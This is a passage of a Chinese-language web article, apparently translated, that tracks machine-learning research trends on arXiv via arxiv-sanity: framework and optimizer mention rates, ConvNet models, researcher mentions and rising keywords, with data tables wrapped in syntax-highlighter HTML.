吗？相当酷，输入一些关键词，然后能看到它们在谷歌中的搜索趋势变化。刚好 arxiv-sanity 论文数据库在过去 5 年内有 28303 份机器学习相关论文，所以我想，为什么不做一些类似的事情，来看看机器学习研究在过去 5 年是如何进展的？结果相当有趣，所以我想我该写篇文章分享一下。</p>\n<p class=\"graf graf--p graf-after--p\"><strong>（机器学习是一个大领域。本文偏重的领域是深度学习——这是我最熟悉的一个分区。）</strong></p>\n<h3 class=\"graf graf--h4 graf-after--p\">arxiv 奇点</h3>\n<p id=\"3f4e\" class=\"graf graf--p graf-after--h4\">让我们首先看下，在 arxiv-sanity 上（<strong class=\"markup--strong markup--p-strong\">cs.AI、cs.LG、cs.CV、cs.CL、cs.NE、stat.ML）的</strong>论文提交总数，见下图：</p>\n<p class=\"graf graf--p graf-after--h4\"><img class=\"alignnone\" src=\"http://wx4.sinaimg.cn/large/7cc829d3gy1fexj496n76j218g0deadf.jpg\" width=\"1600\" height=\"482\"></p>\n<p class=\"graf graf--p graf-after--h4\" style=\"text-align: center;\">（<a href=\"http://wx4.sinaimg.cn/large/7cc829d3gy1fexj496n76j218g0deadf.jpg\" target=\"_blank\">点击查看大图</a>）</p>\n<p id=\"d670\" class=\"graf graf--p graf-after--figure\">是的， 2017 年 3 月这些领域差不多提交了 2000 份论文。峰值可能与会议（比如 NIPS/ICML）的截止日期有关。注意，这里并不能说明该领域本身论文数量规模，因为并不是所有人都会把论文提交到 arxiv ，而且研究人员对一部分论文的分类会随时间变化。但值得指出的是，这些领域有大量的论文。</p>\n<p id=\"b7f0\" class=\"graf graf--p graf-after--p\">把论文的总数作为分母。我们现在可以看下这部分论文包含了哪些我们感兴趣的特定关键词。</p>\n<h3 id=\"95a9\" class=\"graf graf--h4 graf-after--p\">深度学习框架</h3>\n<p class=\"graf graf--p graf-after--h4\">先预热下，让我们看看正在使用的那些深度学习框架。计算这个值时，在整篇论文中任何地方（包括提到的参考书目书名等）提到深度学习框架的这部分论文都被记录在内。对上传于 2017 年 3 月的这部分论文，我们得到如下结果：</p>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd582d0247128613572\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-mixed-highlight\" title=\"含多种语言\"></span><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n% of papers \t framework \t has been around for (months)\r\n------------------------------------------------------------\r\n    9.1          tensorflow       16\r\n    7.1               caffe       37\r\n    4.6              theano       54\r\n    3.3               torch       37\r\n    2.5               keras       19\r\n    1.7          matconvnet       26\r\n    1.2             lasagne       23\r\n    0.5             chainer       16\r\n    0.3               mxnet       17\r\n    0.3                cntk       13\r\n    0.2             pytorch       1\r\n    0.1      deeplearning4j       14</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd582d0247128613572-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd582d0247128613572-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd582d0247128613572-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd582d0247128613572-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594bd582d0247128613572-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd582d0247128613572-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-594bd582d0247128613572-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd582d0247128613572-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-594bd582d0247128613572-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd582d0247128613572-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-594bd582d0247128613572-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd582d0247128613572-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-594bd582d0247128613572-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd582d0247128613572-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-594bd582d0247128613572-15\">15</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd582d0247128613572-1\"><span class=\"crayon-ta\">%</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">of</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">papers</span><span class=\"crayon-h\"> \t </span><span class=\"crayon-i\">framework</span><span class=\"crayon-h\"> \t </span><span class=\"crayon-i\">has</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">been</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">around</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">months</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd582d0247128613572-2\"> </div><div class=\"crayon-line\" id=\"crayon-594bd582d0247128613572-3\"><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd582d0247128613572-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">9.1</span><span class=\"crayon-h\">          </span><span class=\"crayon-i\">tensorflow</span><span class=\"crayon-h\">       </span><span class=\"crayon-cn\">16</span></div><div class=\"crayon-line\" id=\"crayon-594bd582d0247128613572-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">7.1</span><span class=\"crayon-h\">               </span><span class=\"crayon-i\">caffe</span><span class=\"crayon-h\">       </span><span class=\"crayon-cn\">37</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd582d0247128613572-6\"><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">4.6</span><span class=\"crayon-h\">              </span><span class=\"crayon-i\">theano</span><span class=\"crayon-h\">       </span><span class=\"crayon-cn\">54</span></div><div class=\"crayon-line\" id=\"crayon-594bd582d0247128613572-7\"><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">3.3</span><span class=\"crayon-h\">               </span><span class=\"crayon-i\">torch</span><span class=\"crayon-h\">       </span><span class=\"crayon-cn\">37</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd582d0247128613572-8\"><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">2.5</span><span class=\"crayon-h\">               </span><span class=\"crayon-i\">keras</span><span class=\"crayon-h\">       </span><span class=\"crayon-cn\">19</span></div><div class=\"crayon-line\" id=\"crayon-594bd582d0247128613572-9\"><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">1.7</span><span class=\"crayon-h\">          </span><span class=\"crayon-i\">matconvnet</span><span class=\"crayon-h\">       </span><span class=\"crayon-cn\">26</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd582d0247128613572-10\"><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">1.2</span><span class=\"crayon-h\">             </span><span class=\"crayon-i\">lasagne</span><span class=\"crayon-h\">       </span><span class=\"crayon-cn\">23</span></div><div class=\"crayon-line\" id=\"crayon-594bd582d0247128613572-11\"><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">0.5</span><span class=\"crayon-h\">             </span><span class=\"crayon-i\">chainer</span><span class=\"crayon-h\">       </span><span class=\"crayon-cn\">16</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd582d0247128613572-12\"><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">0.3</span><span class=\"crayon-h\">               </span><span class=\"crayon-i\">mxnet</span><span class=\"crayon-h\">       </span><span class=\"crayon-cn\">17</span></div><div class=\"crayon-line\" id=\"crayon-594bd582d0247128613572-13\"><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">0.3</span><span class=\"crayon-h\">                </span><span class=\"crayon-i\">cntk</span><span class=\"crayon-h\">       </span><span class=\"crayon-cn\">13</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd582d0247128613572-14\"><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">0.2</span><span class=\"crayon-h\">             </span><span class=\"crayon-i\">pytorch</span><span class=\"crayon-h\">       </span><span class=\"crayon-cn\">1</span></div><div class=\"crayon-line\" id=\"crayon-594bd582d0247128613572-15\"><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">0.1</span><span class=\"crayon-h\">      </span><span class=\"crayon-i\">deeplearning4j</span><span class=\"crayon-h\">       </span><span class=\"crayon-cn\">14</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0048 seconds] -->\r\n<p></p>\n<p id=\"23ed\" class=\"graf graf--p graf-after--pre\">也就是说，2017 年 3 月提交的论文中有 10% 提到了 TensorFlow 。当然，不是每篇论文都声明了它使用的框架，但如果我们假定那部分声明了该框架的论文，对框架使用有一个比较固定概率的话，那么大约 40% 的社区目前正在使用  TensorFlow （甚至更多，如果你把带 TF 后端的 Keras 也算上）。下图可以看出一些比较流行的框架是如何随时间演变的：</p>\n<p class=\"graf graf--p graf-after--pre\"><img class=\"alignnone aligncenter\" src=\"http://wx4.sinaimg.cn/large/7cc829d3gy1fexj4a4gwej218b0di77c.jpg\" width=\"1595\" height=\"486\"></p>\n<p class=\"graf graf--p graf-after--pre\" style=\"text-align: center;\">（<a href=\"http://wx4.sinaimg.cn/large/7cc829d3gy1fexj4a4gwej218b0di77c.jpg\" target=\"_blank\">点击查看大图</a>）</p>\n<p id=\"aa22\" class=\"graf graf--p graf-after--figure\">我们可以看到  Theano 已经出现一段时间了，但是它的增长几乎停滞。Caffe 在 2014 年急速猛增，但是在过去几个月被  TensorFlow 赶超。Torch（以及最近的 PyTorch）也在攀升，虽缓慢但稳定。接下来几个月的发展会很有趣——我个人的猜测是 Caffe/Theano 会继续有一个缓慢的下降，以及由于 PyTorch 的出现， TF 的增长会稍微变得缓慢。</p>\n<h3 class=\"graf graf--h4 graf-after--p\">ConvNet 模型</h3>\n<p id=\"ba81\" class=\"graf graf--p graf-after--h4\">就乐趣而言，我们何不来看下常见的 ConvNet 模型？这里，我们清楚地看到 ResNets 有一个巨大的攀升：2017 年 3 月它们出现在 9% 的论文中：</p>\n<p class=\"graf graf--p graf-after--h4\"><img class=\"alignnone\" src=\"http://wx4.sinaimg.cn/large/7cc829d3gy1fexj4b24i1j21830diacp.jpg\" width=\"1587\" height=\"486\"></p>\n<p class=\"graf graf--p graf-after--h4\" style=\"text-align: center;\">（<a href=\"http://wx4.sinaimg.cn/large/7cc829d3gy1fexj4b24i1j21830diacp.jpg\" target=\"_blank\">点击查看大图</a>）</p>\n<p id=\"06eb\" class=\"graf graf--p graf-after--figure\">还有，在 InceptionNet 之前谁在讨论 <em class=\"markup--em markup--p-em\">inception？我对此表示好奇。</em></p>\n<h3 id=\"0fe9\" class=\"graf graf--h4 graf-after--p\">优化算法</h3>\n<p id=\"c4bd\" class=\"graf graf--p graf-after--h4\">在优化算法方面，看起来  Adam 连连获胜，2017 年 3 月 23% 的论文中都出现了它！实际的使用比例很难估测；它可能高于 23%，因为一些论文没有声明优化算法，而且很大一部分论文可能甚至没有优化任何神经网络。然后它还可能就是高估了 5% 左右，因为 Adam 在 2014 年 12 月才发布，并且可能与论文作者名字冲突。</p>\n<p class=\"graf graf--p graf-after--h4\"><img class=\"alignnone\" src=\"http://wx2.sinaimg.cn/large/7cc829d3gy1fexj4bnerej218b0di76d.jpg\" width=\"1595\" height=\"486\"></p>\n<p class=\"graf graf--p graf-after--h4\" style=\"text-align: center;\">（<a href=\"http://wx2.sinaimg.cn/large/7cc829d3gy1fexj4bnerej218b0di76d.jpg\" target=\"_blank\">点击查看大图</a>）</p>\n<h3 id=\"0e60\" class=\"graf graf--h4 graf-after--figure\">研究者们</h3>\n<p id=\"d2e0\" class=\"graf graf--p graf-after--h4\">我还好奇深度学习领域重要人物的提及情况，因此作出下图（这有点类似于论文引用量计数，但是：① 它比论文的“0/1”计数更稳定， ② 对总范围进行了标准化。</p>\n<p class=\"graf graf--p graf-after--h4\"><img id=\"pic\" class=\"M_cur_zoom_in\" src=\"http://wx3.sinaimg.cn/large/7cc829d3gy1fexj4cduqcj218b0diq5c.jpg\" width=\"1402\" height=\"427\"></p>\n<p class=\"graf graf--p graf-after--h4\" style=\"text-align: center;\">（<a href=\"http://wx3.sinaimg.cn/large/7cc829d3gy1fexj4cduqcj218b0diq5c.jpg\" target=\"_blank\">点击查看大图</a>）</p>\n<p id=\"d2de\" class=\"graf graf--p graf-after--figure\">值得注意的几点：提交的论文中有 35% 提到了“bengio”，这里有两个 Bengio :  Samy Bengio 和  Yoshua Bengio，我们做了合并。  Geoff Hinton 出现的比例超过 30%！看起来很高。</p>\n<h2 id=\"5e6d\" class=\"graf graf--h3 graf-after--p\">热点或非热点关键词</h2>\n<p id=\"47dd\" class=\"graf graf--p graf-after--h3\">最后，我们不去对关键词做手动分类，而是看一下热点（hot）或者非热点的关键词。</p>\n<h3 id=\"dbcc\" class=\"graf graf--h4 graf-after--p\">Top hot keywords   排前列的热点关键词</h3>\n<p id=\"031c\" class=\"graf graf--p graf-after--h4\">对此有多种定义，但是这次尝试中我查看了所有论文中每个 unigram（单个 word ）或 bigram （ 双 word ），并记录了相比于去年最大使用量的比例。高于这个比例，就是去年有较大潜力但是今年表现出更高的相对频率。热点关键词排名结果如下：</p>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd582d0255387536440\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n8.17394726486 resnet\r\n6.76767676768 tensorflow\r\n5.21818181818 gans\r\n5.0098386462 residual networks\r\n4.34787878788 adam\r\n2.95181818182 batch normalization\r\n2.61663993305 fcn\r\n2.47812783318 vgg16\r\n2.03636363636 style transfer\r\n1.99958217686 gated\r\n1.99057177616 deep reinforcement\r\n1.98428686543 lstm\r\n1.93700787402 nmt\r\n1.90606060606 inception\r\n1.8962962963 siamese\r\n1.88976377953 character level\r\n1.87533998187 region proposal\r\n1.81670721817 distillation\r\n1.81400378481 tree search\r\n1.78578069795 torch\r\n1.77685950413 policy gradient\r\n1.77370153867 encoder decoder\r\n1.74685427385 gru\r\n1.72430399325 word2vec\r\n1.71884293052 relu activation\r\n1.71459655485 visual question\r\n1.70471560525 image generation</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd582d0255387536440-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd582d0255387536440-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd582d0255387536440-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd582d0255387536440-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594bd582d0255387536440-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd582d0255387536440-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-594bd582d0255387536440-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd582d0255387536440-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-594bd582d0255387536440-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd582d0255387536440-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-594bd582d0255387536440-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd582d0255387536440-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-594bd582d0255387536440-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd582d0255387536440-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-594bd582d0255387536440-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd582d0255387536440-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-594bd582d0255387536440-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd582d0255387536440-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-594bd582d0255387536440-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd582d0255387536440-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-594bd582d0255387536440-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd582d0255387536440-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-594bd582d0255387536440-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd582d0255387536440-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-594bd582d0255387536440-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd582d0255387536440-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-594bd582d0255387536440-27\">27</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd582d0255387536440-1\"><span class=\"crayon-cn\">8.17394726486</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">resnet</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd582d0255387536440-2\"><span class=\"crayon-cn\">6.76767676768</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">tensorflow</span></div><div class=\"crayon-line\" id=\"crayon-594bd582d0255387536440-3\"><span class=\"crayon-cn\">5.21818181818</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">gans</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd582d0255387536440-4\"><span class=\"crayon-cn\">5.0098386462</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">residual </span><span class=\"crayon-i\">networks</span></div><div class=\"crayon-line\" id=\"crayon-594bd582d0255387536440-5\"><span class=\"crayon-cn\">4.34787878788</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">adam</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd582d0255387536440-6\"><span class=\"crayon-cn\">2.95181818182</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">batch </span><span class=\"crayon-i\">normalization</span></div><div class=\"crayon-line\" id=\"crayon-594bd582d0255387536440-7\"><span class=\"crayon-cn\">2.61663993305</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">fcn</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd582d0255387536440-8\"><span class=\"crayon-cn\">2.47812783318</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">vgg16</span></div><div class=\"crayon-line\" id=\"crayon-594bd582d0255387536440-9\"><span class=\"crayon-cn\">2.03636363636</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">style </span><span class=\"crayon-i\">transfer</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd582d0255387536440-10\"><span class=\"crayon-cn\">1.99958217686</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">gated</span></div><div class=\"crayon-line\" id=\"crayon-594bd582d0255387536440-11\"><span class=\"crayon-cn\">1.99057177616</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">deep </span><span class=\"crayon-i\">reinforcement</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd582d0255387536440-12\"><span class=\"crayon-cn\">1.98428686543</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">lstm</span></div><div class=\"crayon-line\" id=\"crayon-594bd582d0255387536440-13\"><span class=\"crayon-cn\">1.93700787402</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">nmt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd582d0255387536440-14\"><span class=\"crayon-cn\">1.90606060606</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">inception</span></div><div class=\"crayon-line\" id=\"crayon-594bd582d0255387536440-15\"><span class=\"crayon-cn\">1.8962962963</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">siamese</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd582d0255387536440-16\"><span class=\"crayon-cn\">1.88976377953</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">character </span><span class=\"crayon-i\">level</span></div><div class=\"crayon-line\" id=\"crayon-594bd582d0255387536440-17\"><span class=\"crayon-cn\">1.87533998187</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">region </span><span class=\"crayon-i\">proposal</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd582d0255387536440-18\"><span class=\"crayon-cn\">1.81670721817</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">distillation</span></div><div class=\"crayon-line\" id=\"crayon-594bd582d0255387536440-19\"><span class=\"crayon-cn\">1.81400378481</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">tree </span><span class=\"crayon-i\">search</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd582d0255387536440-20\"><span class=\"crayon-cn\">1.78578069795</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">torch</span></div><div class=\"crayon-line\" id=\"crayon-594bd582d0255387536440-21\"><span class=\"crayon-cn\">1.77685950413</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">policy </span><span class=\"crayon-i\">gradient</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd582d0255387536440-22\"><span class=\"crayon-cn\">1.77370153867</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">encoder </span><span class=\"crayon-i\">decoder</span></div><div class=\"crayon-line\" id=\"crayon-594bd582d0255387536440-23\"><span class=\"crayon-cn\">1.74685427385</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">gru</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd582d0255387536440-24\"><span class=\"crayon-cn\">1.72430399325</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">word2vec</span></div><div class=\"crayon-line\" id=\"crayon-594bd582d0255387536440-25\"><span class=\"crayon-cn\">1.71884293052</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">relu </span><span class=\"crayon-i\">activation</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd582d0255387536440-26\"><span class=\"crayon-cn\">1.71459655485</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">visual </span><span class=\"crayon-i\">question</span></div><div class=\"crayon-line\" id=\"crayon-594bd582d0255387536440-27\"><span class=\"crayon-cn\">1.70471560525</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">image </span><span class=\"crayon-v\">generation</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0024 seconds] -->\r\n<p></p>\n<p id=\"23fb\" class=\"graf graf--p graf-after--pre\">举例来说， ResNet 的比例是 8.17，因为 1 年前（ 2016 年 3 月——最大使用量的月份）它在所有提交的论文中出现的比例是 1.044% ，而上月（ 2017 年 3 月）是  8.53% ，  8.53 / 1.044 ~= 8.17。</p>\n<p class=\"graf graf--p graf-after--pre\">所以可以从上图看到，过去一年盛行的核心创新是： <strong class=\"markup--strong markup--p-strong\">1) ResNets、2) GANs,、3) Adam、4) BatchNorm。</strong>在研究中多使用这些模型。</p>\n<p class=\"graf graf--p graf-after--pre\">在研究兴趣方面，我们看到的是 1)风格转换、2) 深度强化学习、3) 神经网络机器翻译 (“nmt”)，以及 4) 图像生成 。</p>\n<p class=\"graf graf--p graf-after--pre\">在架构上，热点使用是 1) 全卷机网络 ( FCN )、2)  LSTMs / GRUs 、3)  Siamese  网络，以及 4) 编码器-解码器网络。</p>\n<p class=\"graf graf--p graf-after--pre\"><img id=\"pic\" class=\"M_cur_zoom_in\" src=\"http://wx1.sinaimg.cn/large/7cc829d3gy1fexj4cy2nkj218b0dijtc.jpg\" width=\"1402\" height=\"427\"></p>\n<p class=\"graf graf--p graf-after--pre\" style=\"text-align: center;\">（<a href=\"http://wx1.sinaimg.cn/large/7cc829d3gy1fexj4cy2nkj218b0dijtc.jpg\" target=\"_blank\">点击查看大图</a>）</p>\n<h3 id=\"46f1\" class=\"graf graf--h4 graf-after--figure\">非热词</h3>\n<p id=\"52c8\" class=\"graf graf--p graf-after--h4\">在相反的方面呢？有哪些词过去一年有较少的提交，但是历史上较高。以下列举了一些：</p>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd582d025c033293843\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 